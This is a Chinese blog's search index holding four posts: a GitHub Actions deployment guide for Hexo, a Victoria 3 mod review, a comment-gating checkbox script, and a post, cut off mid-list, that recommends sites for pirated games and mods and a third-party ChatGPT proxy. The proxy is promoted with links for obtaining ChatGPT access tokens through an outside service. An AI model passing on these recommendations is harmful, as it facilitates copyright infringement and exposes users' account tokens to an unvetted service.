<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hexo 自动化部署方案</title>
      <link href="/c57f6464.html"/>
      <url>/c57f6464.html</url>
      
        <content type="html"><![CDATA[<h2 id="创建博客源码仓库"><a href="#创建博客源码仓库" class="headerlink" title="创建博客源码仓库"></a>创建博客源码仓库</h2><p>我们需要创建一个用来存放 <mark class="hl-label blue">Hexo</mark>  博客源码的私有仓库</p><p><img src="https://cos.gjcloak.xyz/pigo/202308041114411.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p>创建完成后，需要把博客的源码 push 到这里。</p><p>首先获取远程仓库地址，此处 SSH 和 HTTPS 均可，可以根据需要进行选择。</p><p><img src="https://cos.gjcloak.xyz/pigo/202308041116749.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><div class="note info modern"><p>为了避免一些不必要的麻烦，这里使用私有仓库</p></div><h2 id="Token获取"><a href="#Token获取" class="headerlink" title="Token获取"></a>Token获取</h2><p>访问 Github-&gt;头像（右上角）-&gt;Settings-&gt;Developer Settings-&gt;Personal access tokens-&gt;generate new token,创建的 Token 名称随意，但必须勾选 repo 项 和 workflows 项。</p><p><img src="https://cos.gjcloak.xyz/pigo/202308041122000.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p><img src="https://cos.gjcloak.xyz/pigo/202308041123114.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p><img src="https://cos.gjcloak.xyz/pigo/202308041124688.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><div class="note warning modern"><p>token 只会显示这一次，之后将无法查看，所以务必保证你已经记录下了 Token。之后如果忘记了就只能重新生成重新配置了。</p></div><h2 id="配置-Github-Action"><a href="#配置-Github-Action" class="headerlink" title="配置 Github Action"></a>配置 Github Action</h2><p>在博客根目录的 <mark class="hl-label blue">.github/workflows</mark>  文件夹（如果没有文件夹，则自行创建）下，创建 <mark class="hl-label blue">autodeploy.yml</mark>  文件，并把下面代码复制进去，这里我是用自己的配置，各位可以根据需要进行调整配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">name: 自动部署</span><br><span class="line"></span><br><span class="line">on:</span><br><span class="line">  push:</span><br><span class="line">    branches:</span><br><span class="line">      - master #可以更换成自己的分支</span><br><span class="line"></span><br><span class="line">  release:</span><br><span class="line">    types:</span><br><span class="line">      - published</span><br><span class="line"></span><br><span class="line">jobs:</span><br><span class="line">  deploy:</span><br><span class="line">    runs-on: ubuntu-latest</span><br><span class="line">    steps:</span><br><span class="line">      - name: 检查分支</span><br><span class="line">        uses: actions/checkout@v2</span><br><span class="line">        with:</span><br><span class="line">          ref: master</span><br><span class="line"></span><br><span class="line">      - name: 安装 Node</span><br><span class="line">        uses: actions/setup-node@v1</span><br><span class="line">        with:</span><br><span class="line">          node-version: &quot;16.x&quot;</span><br><span class="line"></span><br><span class="line">      - name: 安装 Hexo</span><br><span class="line">        run: |</span><br><span class="line">          export TZ=&#x27;Asia/Shanghai&#x27;</span><br><span class="line">          npm install hexo-cli -g</span><br><span class="line"></span><br><span class="line">      - name: 缓存 Hexo</span><br><span class="line">        id: cache-npm</span><br><span class="line">        uses: actions/cache@v3</span><br><span class="line">        env:</span><br><span class="line">          cache-name: cache-node-modules</span><br><span class="line">        with:</span><br><span class="line">          path: node_modules</span><br><span class="line">          key: $&#123;&#123; runner.os &#125;&#125;-build-$&#123;&#123; env.cache-name &#125;&#125;-$&#123;&#123; hashFiles(&#x27;**/package-lock.json&#x27;) &#125;&#125;</span><br><span class="line">          restore-keys: |</span><br><span class="line">            $&#123;&#123; runner.os &#125;&#125;-build-$&#123;&#123; env.cache-name &#125;&#125;-</span><br><span class="line">            $&#123;&#123; runner.os &#125;&#125;-build-</span><br><span class="line">            $&#123;&#123; runner.os &#125;&#125;-</span><br><span class="line"></span><br><span class="line">      - name: 安装依赖 </span><br><span class="line">        if: $&#123;&#123; steps.cache-npm.outputs.cache-hit != &#x27;true&#x27; &#125;&#125;</span><br><span class="line">        run: |</span><br><span class="line">          npm install gulp-cli -g</span><br><span class="line">          npm install --save #下面的依赖可以根据需要去除，这个用于gulp压缩使用</span><br><span class="line">          npm install gulp-htmlclean --save-dev</span><br><span class="line">          npm install gulp-html-minifier-terser --save-dev</span><br><span class="line">          npm install gulp-clean-css --save-dev</span><br><span class="line">          npm install gulp-terser --save-dev</span><br><span class="line">          npm install gulp-fontmin --save-dev</span><br><span class="line"></span><br><span class="line">      - name: 生成静态文件</span><br><span class="line">        run: |</span><br><span class="line">          hexo clean</span><br><span class="line">          hexo bangumi -u #获取bilibili追番</span><br><span class="line">          hexo generate</span><br><span class="line">          gulp</span><br><span class="line"></span><br><span class="line">      - name: 部署到云服务器</span><br><span class="line">        uses: Burnett01/rsync-deployments@6.0.0</span><br><span class="line">        with:</span><br><span class="line">          switches: -avzh</span><br><span class="line">          path: public/</span><br><span class="line">          remote_path: #填写服务器网站根目录</span><br><span class="line">          remote_host: #服务器地址或域名</span><br><span class="line">          remote_port: #ssh端口号</span><br><span class="line">          remote_user: #登录用户</span><br><span class="line">          remote_key: $&#123;&#123; secrets.SERVER_KEY &#125;&#125;</span><br><span class="line"></span><br><span class="line">      - name: 部署到Github</span><br><span class="line">        uses: JamesIves/github-pages-deploy-action@v4</span><br><span class="line">        with:</span><br><span class="line">          token: #前面申请的token填入这里</span><br><span class="line">          repository-name: gongjuecloak/gongjuecloak.github.io #更换成自己的静态文件仓库</span><br><span class="line">          branch: master</span><br><span class="line">          folder: public</span><br><span class="line">          commit-message: &quot;$&#123;&#123; github.event.head_commit.message &#125;&#125; Updated By Github Actions&quot;</span><br></pre></td></tr></table></figure><mark class="hl-label blue">secrets.SERVER_KEY</mark>  需要在博客源码仓库的 <mark class="hl-label blue">Setting>>Secret>>Actions</mark>  新建环境变量，命名为 <mark class="hl-label blue">SERVER_KEY</mark> ，填写的内容为服务器的生成秘钥的私钥<p><img src="https://cos.gjcloak.xyz/pigo/202308041134074.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><h2 id="设置仓库和分支"><a href="#设置仓库和分支" class="headerlink" title="设置仓库和分支"></a>设置仓库和分支</h2><ol><li>在博客根目录运行以下指令</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git init #初始化</span><br><span class="line">git remote add origin git@github.com:gongjuecloak/hexo.git #git@github.com:[github用户名]/[博客源码仓库名].git </span><br><span class="line">git checkout -b master # 切换到master分支，</span><br><span class="line">#2020年10月后github新建仓库默认分支改为main，注意更改</span><br><span class="line"># 如果不是，后面的所有设置的分支记得保持一致</span><br></pre></td></tr></table></figure><ol start="2"><li>添加屏蔽项</li></ol><p>因为能够使用指令进行安装的内容不包括在需要提交的源码内，所有我们需要将这些内容添加到屏蔽项，表示不上传到 github 上。这样可以显著减少需要提交的文件量和加快提交速度。打开博客根目录下的 <mark class="hl-label blue">.gitignore</mark>  ,写入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.log</span><br><span class="line">node_modules/</span><br><span class="line">public/</span><br><span class="line">.deploy*/</span><br><span class="line">.deploy_git*/</span><br><span class="line">.idea</span><br><span class="line">themes/anzhiyu/.git</span><br></pre></td></tr></table></figure><p>如果不是anzhiyu主题，记得替换最后一行内容为你自己当前使用的主题。</p><ol start="3"><li>之后再运行 git 提交指令，将博客源码提交到 github 上。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &quot;github action update&quot;</span><br><span class="line">git push origin master</span><br><span class="line">#2020年10月后github新建仓库默认分支改为main，注意更改</span><br></pre></td></tr></table></figure><h2 id="查看部署情况"><a href="#查看部署情况" class="headerlink" title="查看部署情况"></a>查看部署情况</h2><p>此时，打开 GIthub 存放源码的私有仓库，找到 action。</p><p><img src="https://cos.gjcloak.xyz/pigo/202308041143409.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p>进入刚刚的 Commit 记录找到相应的任务,点击 Deploy 查看部署情况</p><p><img src="https://cos.gjcloak.xyz/pigo/202308041144919.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p><img src="https://cos.gjcloak.xyz/pigo/202308041145387.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p>全部打钩即完成自动部署。</p><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://blog.anheyu.com/posts/asdx.html">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://api.iowen.cn/favicon/blog.anheyu.com/posts/asdx.html.png);"></div>        <div class="tag-link-right">            <div class="tag-link-title">使用 Github Action 自动部署</div>            <div class="tag-link-sitename">安知鱼</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://blog.csdn.net/qq_42951560/article/details/122552082">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://api.iowen.cn/favicon/blog.csdn.net/qq_42951560/article/details/122552082.png);"></div>        <div class="tag-link-right">            <div class="tag-link-title">Git + GitHub Action + SSH 将静态网站自动部署到云服务器上</div>            <div class="tag-link-sitename">Xavier Jiezou</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> github </tag>
            
            <tag> github action </tag>
            
            <tag> 自动化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【VIC3】MOD推荐 —— 更真实的人口系统改动</title>
      <link href="/29778300.html"/>
      <url>/29778300.html</url>
      
        <content type="html"><![CDATA[<p>你是不是被V3后期巨量人口增长所烦恼？那就快来订阅一下更真实的人口系统改动这个MOD吧，绝对可以彻底解决后期人口爆炸增长这一老大难问题。</p><h2 id="具体改动介绍"><a href="#具体改动介绍" class="headerlink" title="具体改动介绍"></a>具体改动介绍</h2><ol><li><p>城镇化率和识字率会降低出生率和受抚养人口收入，每提高一级城镇化率就会降低0.001出生率和受抚养人口收入，每提高百分之10识字率就会降低百分之3出生率和百分之2受抚养人口收入</p></li><li><p>将p社原版生活水平英雄人口增速的阈值从8 20 40 调整到6  18   28 也就是代表生活水平6以下的出生率会逐渐减少，6-18出生率一直增加，18人口增长率增幅最快，28时出生率和死亡率达成平衡即不在增长。</p></li><li><p>给每个省份写了出生率变量触发器，根据省份的平均生活水平增加或降低出生率，从6开始增加，12生活水平出生率增加最多，15生活水平出生率开始下降，28生活水平出生率降低最多，之后31往后统一降低百分之十二左右出生率</p></li><li><p>给各种法律和税收加上出生率修正。允许童工会增加百分之五出生率，减百分之五最低工资，增加各种职业百分之五的死亡率.法定监护会增加百分之五的出生率。我在义务小学的基础上又增加了义务中学，这两个都会较大幅度降低出生率，受抚养人口收入，和增加受教育机会。这几个buff配合识字率的增加，必将给之前随随便便增长的出生率给予最沉重的打击。当然我给各种福利法律都加了增加出生率的机制，包括社会福利工人权利公共医疗和经济体制都能增加出生率，以应对出生率一直掉的挑战。税收等级现在也和出生率挂钩，极低低中等高极高税收的出生率分别为+2 +1 0 -2 -4 。</p></li><li><p>给受抚养人口收入加了个减100收入之后，全世界人口都在负增长。因此减少受抚养人口收入就约等于模拟了工业社会越发展就越打击劳动力再生产的过程，所以城镇化率和识字率也和受抚养人口收入减少挂钩，小学和中学法律也会大量降低受抚养人口收入进而降低出生率。之后我给法国开局加了个拿破仑继承法的变量减百分之10出生率。这样就更能模拟出现实中法国不生育的情况。</p></li><li><p>增加了计划生育法律，分为口头鼓励、小幅度鼓励、大幅度鼓励、口头控制、小幅度控制、大幅度控制，选择口头鼓励的话不花费税收但是增加的出生率很少，选择小幅度和大幅度的话会降低百分比的税收以模拟现实，控制生育同理</p></li></ol><h2 id="作者想说的话"><a href="#作者想说的话" class="headerlink" title="作者想说的话"></a>作者想说的话</h2><p>关于控制人口出生率，其实我是不愿意做那种建某种建筑就能精确降低增加出生率的改动，这在现实中也是不可能存在的，我做的这个人口系统改动，其实模拟的是一种人口增长变化的历史大趋势，玩家只能通过扮演国家意志来顺应历史趋势来进行改动。</p><p>以现实社会为例，随着城镇化和教育程度的不断提高，印度的生育率从1950年的6.0一直降低到2022年的2.0，首次低于人口更替线2.1，而印度的大城市生育率仅有1.5。教育和城镇化是最好的避孕药此言不虚。</p><p>而且根据查阅现实人口增减的资料和自己的理解，我个人认为前工业社会出生率高的原因其一就是因为当时生孩子的抚养成本很低，只需要多一双筷子管吃饭就可以，但孩子长大到十几岁就完全可以给家里进行打工赚钱，完全是正收益，因此前工业社会生的孩子越多，家庭收入就越多，因此生育率就很高。而随着工业化社会的不断发展，孩子需要进行教育和学习，生一个孩子不光不能给家庭带来收入反而需要父母来供养，劳动力再生产的成本越来越高，因此出生率就会逐步降低，这是社会发展的趋势，而不是生活水平越高越发展人们就会没有节制的进行生育，这是不可能的，这也直接证明了马尔萨斯主义是错误的。</p><p>因此想要生育率上升，在我这个MOD里只有两种选择，一种是开历史倒车，大幅度降低受教育程度，让孩子不接受教育，女人只能生孩子不能工作，让其精神世界约等于0，也就是对应的允许童工和法定监护，这样就能生育率重回之前的高水平。另一种就是制定各种福利政策，相当于现实社会中的鼓励生育。劳动者权益，社会福利，医疗这些法律越先进，就会增加一定量的出生率，经济体制中的计划经济和合作社所有制也能增加出生率，不过这个效果肯定收效甚微，还是抵不过出生率随着社会发展而降低的大势。</p><h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://pan.baidu.com/s/1DiIZIAVB2eFhi4qLagXeVQ">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://api.iowen.cn/favicon/pan.baidu.com/s/1DiIZIAVB2eFhi4qLagXeVQ.png);"></div>        <div class="tag-link-right">            <div class="tag-link-title">更真实的人口系统改动</div>            <div class="tag-link-sitename">提取码：1848</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><h2 id="预览"><a href="#预览" class="headerlink" title="预览"></a>预览</h2><p><img src="https://cos.gjcloak.xyz/pigo/202308011916636.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p><img src="https://cos.gjcloak.xyz/pigo/202308011916370.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p><img src="https://cos.gjcloak.xyz/pigo/202308011916960.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p><img src="https://cos.gjcloak.xyz/pigo/202308011916736.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p><img src="https://cos.gjcloak.xyz/pigo/202308011916289.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p><img src="https://cos.gjcloak.xyz/pigo/202308011915505.webp?imageMogr2/format/webp/interlace/1/quality/0"></p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VIC3 </tag>
            
            <tag> Mod推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo 条件勾选后显示评论</title>
      <link href="/0.html"/>
      <url>/0.html</url>
      
        <content type="html"><![CDATA[<p>在友链页面的 <mark class="hl-label red">index.md</mark>  中添加如下代码即可完成</p><div class="tabs" id="test3"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test3-1">html</button></li><li class="tab"><button type="button" data-href="#test3-2">javascript</button></li><li class="tab"><button type="button" data-href="#test3-3">css</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test3-1"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;p style=&quot;padding:0 0 0 .8rem&quot;&gt;</span><br><span class="line">    请&lt;strong&gt;勾选&lt;/strong&gt;你符合的条件：</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;div id=&quot;friendlink_checkboxs&quot; style=&quot;padding:0 0 0 1.6rem&quot;&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        &lt;label class=&quot;checkbox&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;checkbox&quot; id=&quot;checkbox1&quot; onclick=&quot;checkForm()&quot;&gt;</span><br><span class="line">            我已添加 &lt;b&gt;公爵书房 | 技术分享&lt;/b&gt; 博客的友情链接</span><br><span class="line">        &lt;/label&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        &lt;label class=&quot;checkbox&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;checkbox&quot; id=&quot;checkbox2&quot; onclick=&quot;checkForm()&quot;&gt;</span><br><span class="line">            我的链接主体为 &lt;b&gt;个人&lt;/b&gt;，网站类型为&lt;b&gt;博客&lt;/b&gt;</span><br><span class="line">        &lt;/label&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        &lt;label class=&quot;checkbox&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;checkbox&quot; id=&quot;checkbox3&quot; onclick=&quot;checkForm()&quot;&gt;网站内不含任何违反当地法律法规的内容</span><br><span class="line">        &lt;/label&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        &lt;label class=&quot;checkbox&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;checkbox&quot; id=&quot;checkbox4&quot; onclick=&quot;checkForm()&quot;&gt;我的网站现在可以在中国大陆区域正常访问</span><br><span class="line">        &lt;/label&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        &lt;label class=&quot;checkbox&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;checkbox&quot; id=&quot;checkbox5&quot; onclick=&quot;checkForm()&quot;&gt;我的网站可以在1分钟内加载完成首屏</span><br><span class="line">        &lt;/label&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div><div class="tab-item-content" id="test3-2"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    var twikooSubmit = document.getElementsByClassName(&quot;tk-submit&quot;)[0];</span><br><span class="line">    if (twikooSubmit) &#123;</span><br><span class="line">        twikooSubmit.style.opacity = &quot;0&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function checkForm() &#123;</span><br><span class="line">        var checkbox1 = document.getElementById(&quot;checkbox1&quot;);</span><br><span class="line">        var checkbox2 = document.getElementById(&quot;checkbox2&quot;);</span><br><span class="line">        var checkbox3 = document.getElementById(&quot;checkbox3&quot;);</span><br><span class="line">        var checkbox4 = document.getElementById(&quot;checkbox4&quot;);</span><br><span class="line">        var checkbox5 = document.getElementById(&quot;checkbox5&quot;);</span><br><span class="line">        var twikooSubmit = document.getElementsByClassName(&quot;tk-submit&quot;)[0];</span><br><span class="line">        if (checkbox1.checked &amp;&amp; checkbox2.checked &amp;&amp; checkbox3.checked &amp;&amp; checkbox4.checked &amp;&amp; checkbox5.checked) &#123;</span><br><span class="line">            twikooSubmit.style.opacity = &quot;1&quot;;</span><br><span class="line">            twikooSubmit.style.height = &quot;auto&quot;;</span><br><span class="line">            twikooSubmit.style.overflow = &quot;auto&quot;;</span><br><span class="line">            var input = document.getElementsByClassName(&#x27;el-textarea__inner&#x27;)[0];</span><br><span class="line">            let evt = document.createEvent(&#x27;HTMLEvents&#x27;);</span><br><span class="line">            evt.initEvent(&#x27;input&#x27;, true, true);</span><br><span class="line">            input.value = &#x27;昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n&#x27;;</span><br><span class="line">            input.dispatchEvent(evt);</span><br><span class="line">            input.focus();</span><br><span class="line">            input.setSelectionRange(-1, -1);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            twikooSubmit.style.opacity = &quot;0&quot;;</span><br><span class="line">            twikooSubmit.style.height = &quot;0&quot;;</span><br><span class="line">            twikooSubmit.style.overflow = &quot;hidden&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div><div class="tab-item-content" id="test3-3"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    .tk-comments &gt; .tk-submit &#123;</span><br><span class="line">        opacity: 0;</span><br><span class="line">        height: 0;</span><br><span class="line">        transition: opacity .5s, height .5s;</span><br><span class="line">        overflow: hidden;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div></div><p>查看想过可前往本站<a href="/link">友链</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分享一个创意工坊和游戏等资源的下载网站！含ChatGPT</title>
      <link href="/df3268ef.html"/>
      <url>/df3268ef.html</url>
      
        <content type="html"><![CDATA[<p>最近<a href="https://steamworkshopdownloader.io/">https://steamworkshopdownloader.io/</a>不是用不了了吗(网址作者跑路了)，这就让学习版玩家不知道如何是从，<br>但接下来的几个网站绝对是满满的干货。</p><h2 id="1、学习班游戏下载网站"><a href="#1、学习班游戏下载网站" class="headerlink" title="1、学习班游戏下载网站"></a>1、学习班游戏下载网站</h2><p><a href="https://repack-games.com/">Repack-Games - Free Download PC Games</a></p><p> 在这个网站中你可以下载各种各样的学习版游戏，里面包含了游戏本体和DLC，基本上只要新游戏一发布，这里就能下载，而且不用翻墙，在中国大陆就能直接访问，但是下载的速度比较慢，建议挂梯子来进行科学上网（懂得都懂）。<strong>此外本网站没有中文。</strong></p><h2 id="2、学习版steam-mod-创意工坊-下载网站"><a href="#2、学习版steam-mod-创意工坊-下载网站" class="headerlink" title="2、学习版steam mod 创意工坊 下载网站"></a>2、学习版steam mod 创意工坊 下载网站</h2><p><a href="https://catalogue.smods.ru/">Skymods - Game Mods Catalogue (smods.ru)</a></p><p>这个网站可以下载到市面上较为主流的游戏mod，例如有“钢铁雄心4、欧陆风云4、城市天际线、文明6、侠盗猎车手”等等，而且传输速度也还可以，在中国大陆可以访问(建议挂梯子)。这真的是属于学习版玩家的福音了，再也不用担心没有MOD的下载途径了。<strong>此外本网站没有中文，在2023年7月1日后点击实体界面会跳转到其他网站，只要关闭即可。</strong></p><h2 id="3、傻狗本狗の小破站-sharelikes-com-cn"><a href="#3、傻狗本狗の小破站-sharelikes-com-cn" class="headerlink" title="3、傻狗本狗の小破站 (sharelikes.com.cn)"></a>3、<a href="https://www.sharelikes.com.cn/">傻狗本狗の小破站 (sharelikes.com.cn)</a></h2><p>想必这个网站就不用我多说了吧，国人制作，里面主要是P社游戏的资源。（就是有时候不稳定）</p><h2 id="4、俄罗斯资源网站"><a href="#4、俄罗斯资源网站" class="headerlink" title="4、俄罗斯资源网站"></a>4、俄罗斯资源网站</h2><p><a href="https://bbs.52pcgame.net/rutracker.net">rutracker.net</a></p><p>俄罗斯的学习版资源网站，里面的资源都是免费的，在中国大陆可以直接访问，里面不光光有游戏资源还有很多别的资源，例如有“Window镜像、俄罗斯大神IDM下载器、虚拟专用网络服务、原子之心”等等，文件的传输速度有些慢，建议挂梯子，<strong>此为本网站没有中文。</strong></p><h2 id="5、吾爱破解"><a href="#5、吾爱破解" class="headerlink" title="5、吾爱破解"></a>5、吾爱破解</h2><p><a href="https://www.52pojie.cn/">吾爱破解 - LCG - LSG安卓破解病毒分析</a><a href="http://www.52pojie.cn/">www.52pojie.cn</a></p><p> 老牌社区网站，以前还好，现在变味了（悲）</p><h2 id="6、Steam下载站"><a href="#6、Steam下载站" class="headerlink" title="6、Steam下载站"></a>6、Steam下载站</h2><p><a href="https://www.s-sgames.com/">SGAMES-专注于精品游戏，各类可联机精品资源 (s-sgames.com)</a></p><p>这个也是一个学习班游戏资源的<strong>中文</strong>下载站，里面有steam的主流游戏，并且排版精美，有详细的游戏介绍（视频、文字、配置等），下载速度很快（毕竟服务器在大陆）。</p><p>顺便分享一个ChatGPT的网站吧！让你也能在大陆<strong>免费顺利</strong>的使用ChatGPT！</p><p>这个网站是Github上的开源项目，由Neo Peng-pengzhile等人联合开发，项目名为“Pandora”（潘多拉）。</p><p>下面是介绍简短的介绍：<br><strong>Pandora</strong></p><p>潘多拉 (Pandora)，一个让你呼吸顺畅的 ChatGPT。</p><p>潘多拉实现了网页版 ChatGPT 的主要操作。后端优化，绕过 Cloudflare，速度喜人。</p><p><strong>体验地址</strong></p><ul><li>点击 <a href="https://chat.zhile.io/">https://chat.zhile.io</a></li><li>最新拿 Access Token 的技术原理，我记录在<a href="https://zhile.io/2023/05/19/how-to-get-chatgpt-access-token-via-pkce.html">这里</a>了。</li><li>可以访问 <a href="http://ai-20230626.fakeopen.com/auth">这里</a> 拿 Access Token</li><li>也可以官方登录，然后访问 <a href="http://chat.openai.com/api/auth/session">这里</a> 拿 Access Token</li><li>Access Token 有效期 14 